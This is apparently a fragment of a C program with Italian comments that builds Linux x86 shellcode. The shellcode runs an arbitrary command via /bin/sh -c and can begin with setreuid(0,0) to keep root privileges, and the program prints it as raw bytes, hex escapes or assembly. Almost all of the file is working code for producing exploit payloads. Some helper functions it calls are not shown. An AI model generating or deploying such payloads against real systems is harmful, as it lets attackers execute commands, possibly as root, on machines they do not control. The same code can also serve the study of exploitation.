#define	__HEX__		0
#define __RAW__		1
#define __ASM__		2
#define DEF_PATH	"/bin/sh"

// La funzione serve per aggiungere a un'array __u8 preesistente
// un'insieme di opcode che servono per "pushare" una stringa nello
// stack (utilizzo di istruzioni come `push` o `push BYTE` o `pushw`)
void appcode(char *str, __u8* shc) {
	int len, i, n;
	len = strlen (str);
	// A seconda della lunghezza della stringa
	// da "pushare" viene utilizzato l'opcode
	// che fa risparmiare più byte.
	switch (len%4) {
		case 1:
			n = 2;
			memset (shc, 0x6a, 1);
			memset (shc+1, str[len-1], 1);
			break;
		case 2:
			n = 5;
			memset (shc, 0x50, 1);
			memset (shc+1, 0x66, 1);
			memset (shc+2, 0x68, 1);
			memcpy (shc+3, str+len-2, 2);
			break;
		case 3:
			n = 6;
			memset (shc, 0x6a, 1);
			memset (shc+1, str[len-1], 1);
			memset (shc+2, 0x66, 1);
			memset (shc+3, 0x68, 1);
			memcpy (shc+4, str+len-3, 2);
			break;
		default:
			n = 1;
			memset (shc, 0x50, 1);
			break;
	}
	for (i=(len-(len%4))-4;i>=0;i-=4) {
		memset (shc+n+((len-(len%4))-4-i)/4*5, 0x68, 1);
		memcpy (shc+n+((len-(len%4))-4-i)/4*5+1, str+i, 4);
	}
}

// Questa funzione genera uno shellcode ricevendo come
// argomenti il comando da eseguire, la path della shell
// che viene utilizzata per lanciare il comando (default: /bin/sh),
// un flag che specifica se utilizzare un setreuid (0, 0) all'inizio
// dello shellcode e un puntatore a int che conterrà la 
// lunghezza dello shellcode.
__u8* shc_gen (char *cmd, char *shell, bool setreuid, int *l) {
	int len, i, n;
	__u8 *shellcode;
	len = (setreuid ? 31:24)+pushlen(strlen(shell))+pushlen(strlen(cmd));
	n=(setreuid ? 9:2);
	// Questo è lo scheletro dello
	// shellcode che verrà generato,
	// a esso si aggiungeranno le
	// istruzioni necessarie per pushare
	// i vari argomenti necessari
	__u8 setuid[] = {
			0x6a,0x46,		//push   $0x46
			0x58,			//pop    %eax
			0x31,0xdb,		//xor    %ebx,%ebx
			0x31,0xc9,		//xor    %ecx,%ecx
			0xcd,0x80		//int    $0x80
		};
	__u8 sh1[] = {
			0x31,0xc0		//xor    %eax,%eax
		};
	__u8 sh2[] = {
			0x89,0xe2,		//mov    %esp,%edx
			0x50,			//push   %eax
			0x66,0x68,0x2d,0x63,	//pushw  $0x632d
			0x89,0xe1		//mov    %esp,%ecx
		};
	__u8 sh3[] = {
			0x89,0xe3,		//mov    %esp,%ebx
			0x50,			//push   %eax
			0x52,			//push   %edx
			0x51,			//push   %ecx
			0x53,			//push   %ebx
			0x89,0xe1,		//mov    %esp,%ecx
			0x99,			//cdq
			0xb0,0x0b,		//mov    $0xb,%al
			0xcd,0x80		//int    $0x80
		};
	shellcode = (__u8*) malloc (len);
	// Se il flag setreuid è settato su true (1) allora
	// all'inizio del codice viene aggiunto il settaggio
	// del real e dell'effective uid a 0.
	// [!!] Attenzione, se viene utilizzato setreuid () e poi
	//      lo shellcode viene eseguito senza la disponibilità
	//      dei privilegi di root l'esecuzione non andrà a buon
	//      fine.
	if (setreuid)
		memcpy (shellcode, setuid, 9);
	else
		memcpy (shellcode, sh1, 2);
	// Viene pushato il comando da eseguire
	appcode (cmd, shellcode+n);
	memcpy (shellcode+n+pushlen (strlen (cmd)), sh2, 9);
	// Viene pushata la shell da utilizzare per
	// l'esecuzione del comando.
	appcode (shell, shellcode+n+9+pushlen (strlen (cmd)));
	memcpy (shellcode+n+9+pushlen (strlen (cmd))+pushlen (strlen (shell)), sh3, 13);
	*l=len;
	return shellcode;
}

// Questa funzione serve per stampare a schermo lo shellcode generato.
// A seconda del formato in cui esso si trova verrà stampato in maniere
// differenti.
void print_shellcode (__u8* shellcode, int len, int flag) {
	int i,byte;
	bool n;
	char *fp, *fp2, *str;
	n = ((shellcode[0]==0x6a) ? true:false);
	// Viene stampato un messaggio di warning nel caso 
	// in cui viene utilizzato il parametro --setuid
	// (leggi quanto viene scritto per comprendere
	// il tipo di problema.
	if ((n) && (flag!=__RAW__))
		printf("// [!] Warning: setreuid(0,0) to use only when possible.\n"
		       "// [!] If the setreuid fails the shellcode won't work\n\n");
	// A seconda del "formato" in cui viene richiesto 
	// lo shellcode esso viene stampato.
	switch (flag) {
		case __RAW__:
			for (i=0;i<len;i++)
				printf ("%c", shellcode[i]);
			break;
		case __HEX__:
			printf ("Shellcode length: %d\n\n", len);
			for (i=0;i<len;i++) {
				if (((i+2)%10==1)||(i==len-1))
					printf ("\\x%.2x\n", shellcode[i]);
				else
					printf ("\\x%.2x", shellcode[i]);
			}
			break;
		case __ASM__:
			fp=format_push (shellcode+(n ? 9:2), &byte);
			fp2=format_push (shellcode+(n ? 18:11)+byte, &byte);
			str = (char*) malloc (n ? 63:17);
			strcpy (str, n ?
				"\tpush\t$0x46\n"
				"\tpop\t%eax\n"
				"\txor\t%ebx,%ebx\n"
				"\txor\t%ecx,%ecx\n"
				"\tint\t$0x80\n":
				"\txor    %eax,%eax\n");
			printf (".global _start\n"
				"_start:\n"
				"%s"
				"%s"
				"\tmov\t%%esp,%%edx\n"
				"\tpush\t%%eax\n"
				"\tpushw\t$0x632d\n"
				"\tmov\t%%esp,%%ecx\n"
				"%s"
				"\tmov\t%%esp,%%ebx\n"
				"\tpush\t%%eax\n"
				"\tpush\t%%edx\n"
				"\tpush\t%%ecx\n"
				"\tpush\t%%ebx\n"
				"\tmov\t%%esp,%%ecx\n"
				"\tcdq\n"
				"\tmov\t$0xb,%%al\n"
				"\tint\t$0x80\n",str,fp,fp2);
			break;
		default:
			break;
	}
}
